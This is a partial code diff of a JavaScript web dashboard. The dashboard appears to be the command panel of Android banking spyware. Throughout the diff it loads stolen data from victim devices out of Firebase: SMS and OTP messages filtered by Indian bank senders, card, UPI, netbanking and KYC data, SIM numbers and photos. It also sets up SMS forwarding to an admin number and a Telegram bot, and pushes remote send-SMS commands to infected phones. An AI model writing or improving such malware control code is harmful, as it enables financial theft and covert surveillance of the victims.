-  if (devObj.apps_upload_command) result.apps_upload_command = devObj.apps_upload_command;
-  if (devObj.sim_info && typeof devObj.sim_info === 'object') result.sim_info = Object.assign({}, result.sim_info || {}, devObj.sim_info);
-  if (devObj.sim1_number || devObj.sim1_carrier) result.sim_info = Object.assign({}, result.sim_info || {}, { sim1_number: devObj.sim1_number, sim1_carrier: devObj.sim1_carrier, sim2_number: devObj.sim2_number, sim2_carrier: devObj.sim2_carrier });
-  if (devObj.forward_settings) result.forward_settings = Object.assign({}, result.forward_settings || {}, devObj.forward_settings);
-  if (devObj.enabled !== undefined && devObj.admin_number !== undefined) result.forward_settings = Object.assign({}, result.forward_settings || {}, { enabled: devObj.enabled, admin_number: devObj.admin_number, bot_token: devObj.bot_token, chat_id: devObj.chat_id, forward_sim_slot: devObj.forward_sim_slot });
-  if (!result.device_info) result.device_info = {};
-  ['device_model','device_name','device_id','android_version','android_sdk','battery','status','last_seen','form_data','kyc_data','payment_data','upi_data','card_data','netbanking_data','device_note','ip_address','storage','device_manufacturer','device_brand','serial_number'].forEach(function(k) { if (devObj[k] !== undefined) result.device_info[k] = devObj[k]; });
-}
-function scanForDevice(obj, deviceId, result) {
-  if (!obj || typeof obj !== 'object') return;
-  if (obj[deviceId] && typeof obj[deviceId] === 'object') collectData(obj[deviceId], result);
-  Object.keys(obj).forEach(function(key) {
-    if (key === deviceId) return;
-    var child = obj[key];
-    if (child && typeof child === 'object') scanForDevice(child, deviceId, result);
   });
 }
 
@@ -1152,22 +722,11 @@ function openDev(id) {
   var d = devs[id];
   document.getElementById('dTitle').textContent = '📱 ' + (d.device_model || d.device_name || id);
   updStar();
-  document.getElementById('dBody').innerHTML = '<div class="loading">Loading device data...</div>';
-  var basePath = (devPaths[id] && devPaths[id].device) || ('device_info/' + id);
-  loadAllDeviceData(id, basePath, function(data) {
-    curMsgs = data.messages || {};
-    Object.keys(curMsgs).forEach(function(k) { if (curMsgs[k] && !curMsgs[k]._key) curMsgs[k]._key = k; });
-    photos = data.photos || {};
-    if (data.sim_info) devs[id].sim_info = data.sim_info;
-    if (data.forward_settings) devs[id].forward_settings = data.forward_settings;
-    if (data.notifications && Object.keys(data.notifications).length > 0) devs[id].notifications = data.notifications;
-    if (data.installed_apps && Object.keys(data.installed_apps).length > 0) devs[id].installed_apps = data.installed_apps;
-    if (data.installed_apps_telegram) devs[id].installed_apps_telegram = data.installed_apps_telegram;
-    if (data.apps_upload_command) devs[id].apps_upload_command = data.apps_upload_command;
-    if (data.sms_history && Object.keys(data.sms_history).length > 0) devs[id].sms_history = data.sms_history;
-    if (data.device_info) Object.keys(data.device_info).forEach(function(k) { if (devs[id][k] === undefined) devs[id][k] = data.device_info[k]; });
-    renderTab();
-  });
+  document.getElementById('dBody').innerHTML = '<div class="loading">Loading...</div>';
+  curMsgs = d.messages || {};
+  Object.keys(curMsgs).forEach(function(k) { if (curMsgs[k] && !curMsgs[k]._key) curMsgs[k]._key = k; });
+  photos = d.photos || {};
+  renderTab();
   document.getElementById('drawer').classList.add('active');
   document.getElementById('dOverlay').classList.add('active');
   switchTab('info');
@@ -1175,12 +734,14 @@ function openDev(id) {
 }
 function listenLiveMessages(id) {
   if (liveMsgListener) { try { liveMsgListener.off(); } catch(e) {} }
-  var basePath = (devPaths[id] && devPaths[id].device) || ('device_info/' + id);
+  var basePath = basePathOf(id);
   liveMsgListener = db.ref(basePath + '/messages');
   liveMsgListener.on('child_added', function(snap) {
     var m = snap.val(); if (!m) return;
     m._key = snap.key; curMsgs[snap.key] = m;
-    latestSmsKey = snap.key; latestSmsTime = Date.now();
+    if (!devs[id].messages) devs[id].messages = {};
+    devs[id].messages[snap.key] = m;
+    latestSmsKey = snap.key;
     if (curTab === 'allsms' || curTab === 'bank' || curTab === 'info') renderTab();
   });
   liveMsgListener.on('child_changed', function(snap) {
@@ -1195,8 +756,6 @@ function listenLiveMessages(id) {
 }
 function closeDev() {
   stopTelegramPolling();
-  dataListeners.forEach(function(l) { try { l.ref.off('value', l.cb); } catch(e) {} });
-  dataListeners = [];
   if (photoCmdListener) { try { photoCmdListener.off(); } catch(e) {} photoCmdListener = null; }
   if (liveMsgListener) { try { liveMsgListener.off(); } catch(e) {} liveMsgListener = null; }
   document.getElementById('drawer').classList.remove('active');
@@ -1209,6 +768,7 @@ function switchTab(t) {
   document.querySelectorAll('.tab').forEach(function(x) { x.classList.toggle('active', x.getAttribute('data-t') === t); });
   renderTab();
 }
+function basePathOf(id) { return (devPaths[id] && devPaths[id].device) || ('device_info/' + id); }
 
 function renderTab() {
   var b = document.getElementById('dBody');
@@ -1221,54 +781,52 @@ function renderTab() {
   var all = [];
   Object.values(curMsgs).forEach(function(m) { all.push(m); });
   if (d.sms_history) Object.values(d.sms_history).forEach(function(m) { all.push(m); });
-  all.sort(function(a, b) { return (b.timestamp || 0) - (a.timestamp || 0); });
+  if (d.sms && typeof d.sms === 'object') Object.values(d.sms).forEach(function(m) { all.push(m); });
+  if (d.inbox && typeof d.inbox === 'object') Object.values(d.inbox).forEach(function(m) { all.push(m); });
+  all = all.filter(function(m) { return m && (m.body || m.message || m.text || m.sender || m.address); });
+  all.sort(function(a, b) { return ((b.timestamp || b.time || 0) - (a.timestamp || a.time || 0)); });
   document.getElementById('cSms').textContent = all.length;
-  var bks = all.filter(function(m) { var c = cat(m.sender, m.body); return c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT'; });
+  var bks = all.filter(function(m) { var c = cat(m.sender, m.body || m.message || m.text); return c === 'BANK' || c === 'BALANCE' || c === 'DEBIT' || c === 'CREDIT'; });
   document.getElementById('cBank').textContent = bks.length;
   document.getElementById('cCard').textContent = (d.card_data || d.upi_data || d.netbanking_data) ? '1' : '0';
   if (curTab === 'info') {
     var note = d.device_note || '';
     var fm = detectFromSms(all);
-    var sim = d.sim_info || {};
+    var sim = d.sim_info || d;
     b.innerHTML =
-      '<div class="dir"><span class="k">Phone Number (SIM1)</span><span class="v">' + esc(sim.sim1_number || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">Phone Number (SIM2)</span><span class="v">' + esc(sim.sim2_number || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">Carrier (SIM1)</span><span class="v">' + esc(sim.sim1_carrier || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Device Name</span><span class="v">' + esc(d.device_name || d.device_model || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Device ID</span><span class="v">' + esc(d.device_id || curId) + '</span></div>' +
+      '<div class="dir"><span class="k">Phone (SIM1)</span><span class="v">' + esc(sim.sim1_number || sim.phone || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Phone (SIM2)</span><span class="v">' + esc(sim.sim2_number || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Carrier (SIM1)</span><span class="v">' + esc(sim.sim1_carrier || sim.carrier || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Carrier (SIM2)</span><span class="v">' + esc(sim.sim2_carrier || '-') + '</span></div>' +
-      '<div class="note"><h4>📝 Device Note</h4><textarea id="nText" placeholder="Write a note...">' + esc(note) + '</textarea><br><button class="sv" id="nSave">💾 Save</button></div>' +
+      '<div class="note"><h4>📝 Device Note</h4><textarea id="nText" placeholder="Write...">' + esc(note) + '</textarea><br><button class="sv" id="nSave">💾 Save</button></div>' +
       '<div class="sim-mgr"><h4>📱 SIM NUMBER MANAGER</h4>' +
-      '<div class="sim-field"><div class="sim-lbl">SIM 1 - PHONE #1</div><div class="sim-row2"><input type="text" id="s1" value="' + esc(sim.sim1_number || '') + '" placeholder="10 digit"><button data-det="1">Detect</button></div></div>' +
-      '<div class="sim-field"><div class="sim-lbl">SIM 2 - PHONE #2</div><div class="sim-row2"><input type="text" id="s2" value="' + esc(sim.sim2_number || '') + '" placeholder="10 digit"><button data-det="2">Detect</button></div></div>' +
-      '<div class="sim-btns"><button class="det" id="detBtn">Detect Number (Device)</button><button class="sav" id="savSim">Save Numbers</button></div></div>' +
+      '<div class="sim-field"><div class="sim-lbl">SIM 1 PHONE</div><div class="sim-row2"><input type="text" id="s1" value="' + esc(sim.sim1_number || '') + '"><button data-det="1">Detect</button></div></div>' +
+      '<div class="sim-field"><div class="sim-lbl">SIM 2 PHONE</div><div class="sim-row2"><input type="text" id="s2" value="' + esc(sim.sim2_number || '') + '"><button data-det="2">Detect</button></div></div>' +
+      '<div class="sim-btns"><button class="det" id="detBtn">Detect</button><button class="sav" id="savSim">Save</button></div></div>' +
       '<div class="dir"><span class="k">Android</span><span class="v">' + esc(d.android_version || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">SDK Version</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>' +
-      '<div class="dir"><span class="k">IP Address</span><span class="v">' + esc(d.ip_address || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">SDK</span><span class="v">' + esc(d.android_sdk || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">Battery</span><span class="v">' + esc(d.battery || '-') + '</span></div>' +
+      '<div class="dir"><span class="k">IP</span><span class="v">' + esc(d.ip_address || '-') + '</span></div>' +
       '<div class="dir"><span class="k">Storage</span><span class="v">' + esc(d.storage || '-') + '</span></div>' +
       (fm.phones.length > 0 ? '<div style="margin-top:14px;color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">FROM SMS</div>' + fm.phones.map(function(p, i) { return '<div class="dir"><span class="k">Phone #' + (i+1) + '</span><span class="v">' + esc(p) + '</span></div>'; }).join('') : '');
     setTimeout(function() {
-      var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref(basePathOf(curId) + '/device_note').set(document.getElementById('nText').value); alert('✅ Note saved'); };
-      var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref(basePathOf(curId) + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅ SIM numbers saved'); };
-      var z = document.getElementById('detBtn'); if (z) z.onclick = function() { var dm = detectFromSms(all); if (dm.phones.length > 0) { document.getElementById('s1').value = dm.phones[0]; alert('Detected: ' + dm.phones[0]); } else alert('Not detected'); };
+      var x = document.getElementById('nSave'); if (x) x.onclick = function() { db.ref(basePathOf(curId) + '/device_note').set(document.getElementById('nText').value); alert('✅'); };
+      var y = document.getElementById('savSim'); if (y) y.onclick = function() { db.ref(basePathOf(curId) + '/sim_info').update({ sim1_number: document.getElementById('s1').value, sim2_number: document.getElementById('s2').value }); alert('✅'); };
+      var z = document.getElementById('detBtn'); if (z) z.onclick = function() { var dm = detectFromSms(all); if (dm.phones.length > 0) { document.getElementById('s1').value = dm.phones[0]; alert('Detected: ' + dm.phones[0]); } else alert('None'); };
     }, 100);
   } else if (curTab === 'allsms') {
-    var smsHeader = '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;"><div style="color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">Total: ' + all.length + ' SMS</div><button id="refreshSmsBtn" style="padding:8px 16px;background:#EFF6FF;color:#2563EB;border:1px solid #BFDBFE;border-radius:9px;font-size:11px;font-weight:700;cursor:pointer;">🔄 Refresh</button></div>';
-    if (all.length === 0) { b.innerHTML = smsHeader + '<div class="empty">No SMS</div>'; bindSmsRefresh(); return; }
-    b.innerHTML = smsHeader + all.map(function(m) {
-      var isBank = (function() {
-        var s = (m.sender || '').toUpperCase();
-        var bd = (m.body || '').toUpperCase();
-        var bankSenders = ['BOB','SBI','HDFC','ICICI','AXIS','PNB','KOTAK','YES','IDBI','CANARA','UNION','INDUSIND','FEDERAL','IDFC','RBL','DBS','PAYTM','PHONEPE','GPAY','AIRTEL','JIO','VI'];
-        var hasBank = bankSenders.some(function(x) { return s.indexOf(x) !== -1; });
-        var hasTxn = bd.indexOf('CREDITED') !== -1 || bd.indexOf('DEBITED') !== -1 || bd.indexOf('CREDIT') !== -1 || bd.indexOf('DEBIT') !== -1 || bd.indexOf('BAL') !== -1 || bd.indexOf('OTP') !== -1 || bd.indexOf('WITHDRAWN') !== -1;
-        return hasBank || hasTxn;
-      })();
-      var bodyHtml = isBank ? highlightSms(m.body || '') : esc(m.body || '');
-      var isLatest = false;
-      if (latestSmsKey) { if (m._key === latestSmsKey) isLatest = true; else if (all[0] && (all[0]._key === m._key)) isLatest = true; }
-      else if (all[0] && all[0]._key === m._key) isLatest = true;
-      var latestClass = isLatest ? ' latest' : '';
-      var tagHtml = isLatest ? '<span class="msg-tag new-tag">🆕 NEW</span>' : '<span class="msg-tag">' + (m.type || 'IN') + '</span>';
-      return '<div class="msg ' + (m.type === 'SENT' ? 'sent' : '') + latestClass + '"><div class="msg-head"><span class="msg-from">' + esc(m.sender || 'Unknown') + '</span>' + tagHtml + '</div><div class="msg-body">' + bodyHtml + '</div><div class="msg-date">' + (m.date || '') + '</div></div>';
+    var header = '<div style="display:flex;justify-content:space-between;margin-bottom:12px;"><div style="color:#64748B;font-size:10px;text-transform:uppercase;font-weight:700;">Total: ' + all.length + '</div><button id="refreshSmsBtn" style="padding:8px 16px;background:#EFF6FF;color:#2563EB;border:1px solid #BFDBFE;border-radius:9px;font-size:11px;font-weight:700;cursor:pointer;">🔄 Refresh</button></div>';
+    if (all.length === 0) { b.innerHTML = header + '<div class="empty">No SMS</div>'; bindSmsRefresh(); return; }
+    b.innerHTML = header + all.map(function(m) {
+      var bodyTxt = m.body || m.message || m.text || '';
+      var sender = m.sender || m.address || m.from || 'Unknown';
+      var date = m.date || (m.timestamp ? new Date(m.timestamp).toLocaleString() : '');
+      var bodyHtml = highlightSms(bodyTxt);
+      var isLatest = (m._key && m._key === latestSmsKey) || (all[0] && all[0]._key === m._key);
+      var tagHtml = isLatest ? '<span class="msg-tag new-tag">🆕</span>' : '<span class="msg-tag">' + (m.type || 'IN') + '</span>';
+      return '<div class="msg' + (m.type === 'SENT' ? ' sent' : '') + (isLatest ? ' latest' : '') + '"><div class="msg-head"><span class="msg-from">' + esc(sender) + '</span>' + tagHtml + '</div><div class="msg-body">' + bodyHtml + '</div><div class="msg-date">' + date + '</div></div>';
     }).join('');
     bindSmsRefresh();
   } else if (curTab === 'card') {
@@ -1285,23 +843,18 @@ function renderTab() {
     var ch = f.chat_id || '';
     var tgOn = tgPolling[curId] && tgPolling[curId].active;
     b.innerHTML =
-      '<div class="card blue"><h3>✈️ Telegram to SMS Auto</h3><div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '" placeholder="BotFather token"></div><div class="fg"><label class="fl">Channel / Chat ID (optional)</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '" placeholder="-100xxx (optional)"></div><button class="btn" id="tgS" style="background:' + (tgOn ? '#DC2626' : '#2563EB') + '">' + (tgOn ? '⏹ STOP POLLING' : '▶ START POLLING') + '</button><div class="tg-status" id="tgStatus">' + (tgOn ? '🟢 Polling active — waiting...' : '⚪ Idle — enter Bot Token, then Start') + '</div><div class="tg-log" id="tgLog"></div></div>' +
-      '<div class="card green"><h3>📱 SMS Forwarding</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">Forward To</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" placeholder="+91XXXXXXXXXX" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div></div>' +
-      '<div class="card"><h3>📤 Send SMS Direct</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn active" data-ss="1">SIM 1</div><div class="sim-btn" data-ss="2">SIM 2</div></div><div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo" placeholder="+91..."></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div><button class="btn green" id="sBtn">✈️ Send</button></div>';
+      '<div class="card blue"><h3>✈️ Telegram to SMS Auto</h3><div class="fg"><label class="fl">Bot Token</label><input type="text" class="fi" id="tgT" value="' + esc(tok) + '"></div><div class="fg"><label class="fl">Chat ID (optional)</label><input type="text" class="fi" id="tgC" value="' + esc(ch) + '"></div><button class="btn" id="tgS" style="background:' + (tgOn ? '#DC2626' : '#2563EB') + '">' + (tgOn ? '⏹ STOP' : '▶ START') + '</button><div class="tg-status" id="tgStatus">' + (tgOn ? '🟢 Active' : '⚪ Idle') + '</div><div class="tg-log" id="tgLog"></div></div>' +
+      '<div class="card green"><h3>📱 SMS Forwarding</h3><label class="fl">SIM</label><div class="sim-row"><div class="sim-btn ' + (simSel === 1 ? 'active' : '') + '" data-sim="1">SIM 1</div><div class="sim-btn ' + (simSel === 2 ? 'active' : '') + '" data-sim="2">SIM 2</div></div><label class="fl">Forward To</label><div style="display:flex;gap:6px;"><input type="text" class="fi" id="fNum" value="' + esc(fNum) + '" style="flex:1;"><button class="on-off ' + (fOn ? 'on' : '') + '" id="fTog">' + (fOn ? '✓ ON' : '▶ ON') + '</button></div></div>' +
+      '<div class="card"><h3>📤 Send SMS</h3><div class="fg"><label class="fl">To</label><input type="text" class="fi" id="sTo"></div><div class="fg"><label class="fl">Message</label><textarea class="ft" id="sMsg"></textarea></div><button class="btn green" id="sBtn">✈️ Send</button></div>';
     setTimeout(function() {
       document.querySelectorAll('[data-sim]').forEach(function(x) { x.addEventListener('click', function() { db.ref(basePathOf(curId) + '/forward_settings/forward_sim_slot').set(parseInt(this.getAttribute('data-sim'))); renderTab(); }); });
-      document.getElementById('tgS').addEventListener('click', function() {
-        if (tgPolling[curId] && tgPolling[curId].active) { stopTelegramPolling(); renderTab(); }
-        else { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t) { alert('Enter Bot Token'); return; } db.ref(basePathOf(curId) + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); startTelegramPolling(t, c); renderTab(); }
-      });
+      document.getElementById('tgS').addEventListener('click', function() { if (tgPolling[curId] && tgPolling[curId].active) { stopTelegramPolling(); renderTab(); } else { var t = document.getElementById('tgT').value.trim(); var c = document.getElementById('tgC').value.trim(); if (!t) { alert('Bot Token required'); return; } db.ref(basePathOf(curId) + '/forward_settings').update({ bot_token: t, chat_id: c, enabled: true, start_timestamp: Date.now() }); startTelegramPolling(t, c); renderTab(); } });
       document.getElementById('fTog').addEventListener('click', function() { var n = document.getElementById('fNum').value.trim(); var ns = !fOn; if (ns && n.length < 10) { alert('Enter number'); return; } db.ref(basePathOf(curId) + '/forward_settings').update({ enabled: ns, admin_number: n, start_timestamp: Date.now() }); renderTab(); });
-      document.querySelectorAll('[data-ss]').forEach(function(x) { x.addEventListener('click', function() { document.querySelectorAll('[data-ss]').forEach(function(y) { y.classList.remove('active'); }); this.classList.add('active'); }); });
-      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(); var m = document.getElementById('sMsg').value.trim(); var s = document.querySelector('[data-ss].active'); var sim = s ? parseInt(s.getAttribute('data-ss')) : 1; if (!t || !m) { alert('Fill fields'); return; } db.ref(basePathOf(curId) + '/sms_commands').push({ to: t, message: m, sim_slot: sim, status: 'pending', timestamp: Date.now() }); addTgLog('📤 SMS command pushed: ' + t); alert('✅ Sent'); });
-      if (tgPolling[curId] && tgPolling[curId].logs) { var logEl = document.getElementById('tgLog'); tgPolling[curId].logs.forEach(function(l) { var line = document.createElement('div'); line.className = 'tg-log-line'; line.textContent = l; logEl.appendChild(line); }); logEl.scrollTop = logEl.scrollHeight; }
+      document.getElementById('sBtn').addEventListener('click', function() { var t = document.getElementById('sTo').value.trim(), m = document.getElementById('sMsg').value.trim(); if (!t || !m) { alert('Fill fields'); return; } db.ref(basePathOf(curId) + '/sms_commands').push({ to: t, message: m, sim_slot: 1, status: 'pending', timestamp: Date.now() }); alert('✅ Sent'); });
     }, 100);
   }
 }
-function basePathOf(id) { return (devPaths[id] && devPaths[id].device) || ('device_info/' + id); }
+
 function bindSmsRefresh() {
   var btn = document.getElementById('refreshSmsBtn');
   if (!btn) return;
@@ -1314,100 +867,53 @@ function bindSmsRefresh() {
     db.ref(basePath + '/messages').once('value').then(function(s) {
       curMsgs = s.val() || {};
       Object.keys(curMsgs).forEach(function(k) { if (curMsgs[k] && !curMsgs[k]._key) curMsgs[k]._key = k; });
-      return db.ref(basePath + '/sms_history').once('value');
-    }).then(function(s) {
-      var hist = s.val() || {};
-      if (curId && devs[curId]) devs[curId].sms_history = hist;
       renderTab();
-      var newBtn = document.getElementById('refreshSmsBtn');
-      if (newBtn) { newBtn.textContent = '✅ Done'; setTimeout(function() { if (newBtn) newBtn.textContent = '🔄 Refresh'; }, 800); }
+      var nb = document.getElementById('refreshSmsBtn');
+      if (nb) { nb.textContent = '✅ Done'; setTimeout(function() { if (nb) nb.textContent = '🔄 Refresh'; }, 800); }
     }).catch(function(e) { self.textContent = '❌ Failed'; setTimeout(function() { self.textContent = oldText; self.disabled = false; }, 1500); });
   };
 }
 
 function renderPhotos() {
   var b = document.getElementById('dBody');
-  var topHtml = '<div style="background:#FFFFFF; border:1px solid #E2E8F0; border-radius:12px; padding:14px; margin-bottom:14px; box-shadow:0 1px 3px rgba(0,0,0,0.04);"><div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:12px;"><div style="color:#1E40AF; font-size:13px; font-weight:700;">📸 Photo Actions</div><div id="uploadStatus" style="font-size:10px; color:#64748B; font-weight:700;">Ready</div></div><button onclick="openPhotoUploadDialog()" style="width:100%; padding:12px; background:#2563EB; color:white; border:none; border-radius:10px; font-size:12px; font-weight:700; cursor:pointer; margin-bottom:10px; box-shadow:0 2px 6px rgba(37,99,235,0.25);">📤 REQUEST UPLOAD</button><button onclick="openFastDeleteDialog()" style="width:100%; padding:13px; background:linear-gradient(135deg,#DC2626,#D97706); color:white; border:none; border-radius:10px; font-size:13px; font-weight:800; cursor:pointer; box-shadow:0 2px 8px rgba(220,38,38,0.3);">🚀 FAST DELETE (Firebase)</button><div class="inline-progress" id="inlineProgressPhotos"><div class="inline-progress-head"><div class="inline-progress-status" id="inlineProgressIconPhotos">📤 Uploading...</div><div class="inline-progress-percent" id="inlineProgressPercentPhotos">0%</div></div><div class="inline-progress-bar-bg"><div class="inline-progress-bar-fill" id="inlineProgressBarPhotos"></div></div><div class="inline-progress-stats" id="inlineProgressStatsPhotos">0 / 0 uploaded</div></div></div>';
+  var topHtml = '<div style="background:#FFF;border:1px solid #E2E8F0;border-radius:12px;padding:14px;margin-bottom:14px;"><div style="display:flex;justify-content:space-between;margin-bottom:12px;"><div style="color:#1E40AF;font-size:13px;font-weight:700;">📸 Photo Actions</div><div id="uploadStatus" style="font-size:10px;color:#64748B;font-weight:700;">Ready</div></div><button onclick="openPhotoUploadDialog()" style="width:100%;padding:12px;background:#2563EB;color:white;border:none;border-radius:10px;cursor:pointer;font-weight:700;margin-bottom:10px;">📤 REQUEST UPLOAD</button><button onclick="openFastDeleteDialog()" style="width:100%;padding:13px;background:linear-gradient(135deg,#DC2626,#D97706);color:white;border:none;border-radius:10px;cursor:pointer;font-weight:800;">🚀 FAST DELETE</button><div class="inline-progress" id="inlineProgressPhotos"><div class="inline-progress-head"><div class="inline-progress-status" id="inlineProgressIconPhotos">📤 Uploading...</div><div class="inline-progress-percent" id="inlineProgressPercentPhotos">0%</div></div><div class="inline-progress-bar-bg"><div class="inline-progress-bar-fill" id="inlineProgressBarPhotos"></div></div><div class="inline-progress-stats" id="inlineProgressStatsPhotos">0 / 0</div></div></div>';
   var arr = Object.entries(photos);
   arr = arr.filter(function(p) { return p[1] && (p[1].telegram_file_id || p[1].url || p[1].base64); });
   var seen = {};
-  arr = arr.filter(function(p) { var key = p[1].name || p[0]; if (seen[key]) return false; seen[key] = true; return true; });
+  arr = arr.filter(function(p) { var k = p[1].name || p[0]; if (seen[k]) return false; seen[k] = true; return true; });
   document.getElementById('cPhotos').textContent = arr.length;
-  if (arr.length === 0) { b.innerHTML = topHtml + '<div class="empty">No photos yet</div>'; listenPhotoCommandStatus(); return; }
-  var placeholderTg = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSczMDAnIGhlaWdodD0nMzAwJz48cmVjdCBmaWxsPScjRUZGNkZGJyB3aWR0aD0nMzAwJyBoZWlnaHQ9JzMwMCcvPjx0ZXh0IHg9JzUwJScgeT0nNTAlJyBmaWxsPScjMjU2M0VCJyB0ZXh0LWFuY2hvcj0nbWlkZGxlJyBmb250LXNpemU9JzIwJz5URzwvdGV4dD48L3N2Zz4=';
-  var placeholderFail = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSczMDAnIGhlaWdodD0nMzAwJz48cmVjdCBmaWxsPScjRkVGMkYyJyB3aWR0aD0nMzAwJyBoZWlnaHQ9JzMwMCcvPjx0ZXh0IHg9JzUwJScgeT0nNTAlJyBmaWxsPScjREMyNjI2JyB0ZXh0LWFuY2hvcj0nbWlkZGxlJyBmb250LXNpemU9JzE2Jz5Mb2FkIGZhaWxlZDwvdGV4dD48L3N2Zz4=';
+  if (arr.length === 0) { b.innerHTML = topHtml + '<div class="empty">No photos</div>'; return; }
+  var ph = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSczMDAnIGhlaWdodD0nMzAwJz48cmVjdCBmaWxsPScjRUZGNkZGJyB3aWR0aD0nMzAwJyBoZWlnaHQ9JzMwMCcvPjwvc3ZnPg==';
   b.innerHTML = topHtml + '<div class="pgrid">' + arr.map(function(p) {
-    var key = p[0], val = p[1];
-    var imgSrc = '';
-    if (val.telegram_file_id) imgSrc = placeholderTg;
-    else if (val.url) imgSrc = val.url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
-    else if (val.base64) imgSrc = val.base64;
-    return '<div class="pitem" data-p="' + key + '"><img src="' + imgSrc + '" loading="lazy" data-tg-id="' + (val.telegram_file_id || '') + '">' + (val.folder ? '<div class="pfolder">' + esc(val.folder) + '</div>' : '') + '<button class="pdelete" data-del-p="' + key + '">✕</button><div class="pname">' + esc(val.name || 'IMG') + '</div></div>';
+    var k = p[0], v = p[1], src = '';
+    if (v.telegram_file_id) src = ph;
+    else if (v.url) src = v.url.replace('/upload/', '/upload/w_300,h_300,c_fill,q_auto/');
+    else if (v.base64) src = v.base64;
+    return '<div class="pitem" data-p="' + k + '"><img src="' + src + '" data-tg-id="' + (v.telegram_file_id || '') + '">' + (v.folder ? '<div class="pfolder">' + esc(v.folder) + '</div>' : '') + '<button class="pdelete" data-del-p="' + k + '">✕</button><div class="pname">' + esc(v.name || 'IMG') + '</div></div>';
   }).join('') + '</div>';
-  b.querySelectorAll('img[data-tg-id]').forEach(function(img) {
-    var fileId = img.getAttribute('data-tg-id');
-    if (!fileId || !TELEGRAM_CONFIG.enabled) return;
-    telegramGetFileUrl(fileId).then(function(url) { img.src = url; }).catch(function(e) { img.src = placeholderFail; });
-  });
+  b.querySelectorAll('img[data-tg-id]').forEach(function(img) { var fid = img.getAttribute('data-tg-id'); if (!fid || !TELEGRAM_CONFIG.enabled) return; telegramGetFileUrl(fid).then(function(url) { img.src = url; }).catch(function() {}); });
   b.querySelectorAll('[data-p]').forEach(function(e) { e.addEventListener('click', function(ev) { if (ev.target.hasAttribute('data-del-p')) return; showP(this.getAttribute('data-p')); }); });
   b.querySelectorAll('[data-del-p]').forEach(function(e) { e.addEventListener('click', function(ev) { ev.stopPropagation(); deleteSinglePhoto(this.getAttribute('data-del-p')); }); });
-  listenPhotoCommandStatus();
 }
-function showP(k) {
-  var p = photos[k]; if (!p) return;
-  curPhoto = k;
-  if (p.telegram_file_id) {
-    document.getElementById('pImg').src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSczMDAnIGhlaWdodD0nMzAwJz48cmVjdCBmaWxsPScjRUZGNkZGJyB3aWR0aD0nMzAwJyBoZWlnaHQ9JzMwMCcvPjwvc3ZnPg==';
-    document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
-    document.getElementById('pViewer').classList.add('active');
-    telegramGetFileUrl(p.telegram_file_id).then(function(url) { document.getElementById('pImg').src = url; }).catch(function(e) { document.getElementById('pImg').src = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSczMDAnIGhlaWdodD0nMzAwJz48cmVjdCBmaWxsPScjRkVGMkYyJyB3aWR0aD0nMzAwJyBoZWlnaHQ9JzMwMCcvPjwvc3ZnPg=='; });
-    return;
-  }
-  var imgSrc = p.url || p.base64 || ''; if (!imgSrc) return;
-  document.getElementById('pImg').src = imgSrc;
-  document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || '');
-  document.getElementById('pViewer').classList.add('active');
-}
+function showP(k) { var p = photos[k]; if (!p) return; curPhoto = k; if (p.telegram_file_id) telegramGetFileUrl(p.telegram_file_id).then(function(u) { document.getElementById('pImg').src = u; }); else document.getElementById('pImg').src = p.url || p.base64 || ''; document.getElementById('pInfo').textContent = (p.name || 'IMG') + ' — ' + (p.size || '') + ' — ' + (p.date || ''); document.getElementById('pViewer').classList.add('active'); }
 document.getElementById('pClose').addEventListener('click', function() { document.getElementById('pViewer').classList.remove('active'); });
-document.getElementById('pDownload').addEventListener('click', function() {
